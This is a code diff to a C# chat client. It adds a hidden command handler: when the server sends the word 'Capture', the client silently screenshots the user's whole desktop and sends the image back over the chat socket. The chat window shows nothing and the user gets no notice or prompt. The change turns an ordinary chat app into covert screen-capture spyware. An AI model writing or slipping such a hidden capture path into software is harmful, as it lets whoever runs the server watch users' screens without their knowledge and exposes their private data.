@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
@@ -18,7 +19,7 @@ namespace chatclient
 
         private Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
-        byte[] receivedBuf = new byte[1024];
+        byte[] receivedBuf = new byte[450560];
 
 
         public Form1()
@@ -41,13 +42,43 @@ namespace chatclient
                 Array.Copy(receivedBuf, dataBuf, received);
                 string text = Encoding.ASCII.GetString(dataBuf);
 
-                txtchat.Invoke((MethodInvoker)(() => txtchat.AppendText(text + "\r\n")));
+                if(text == "Capture")
+                {
+                    capture();
+                }
+                else
+                {
+                    txtchat.Invoke((MethodInvoker)(() => txtchat.AppendText(text + "\r\n")));
+                }
+                
 
                 _clientSocket.BeginReceive(receivedBuf, 0, receivedBuf.Length, SocketFlags.None, new AsyncCallback(ReceiveData), _clientSocket);
             }
           
         }
 
+        private void capture()
+        {
+
+            Bitmap memoryImage = new Bitmap(1920, 1080);
+            Size s = new Size(memoryImage.Width, memoryImage.Height);
+
+            Graphics memoryGraphics = Graphics.FromImage(memoryImage);
+
+            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
+
+
+            _clientSocket.Send(converterDemo(memoryImage));
+        }
+
+        public static byte[] converterDemo(Image x)
+        {
+            ImageConverter _imageConverter = new ImageConverter();
+            byte[] xByte = (byte[])_imageConverter.ConvertTo(x, typeof(byte[]));
+            return xByte;
+        }
+
+        
 
         private void LoopConnect()
         {
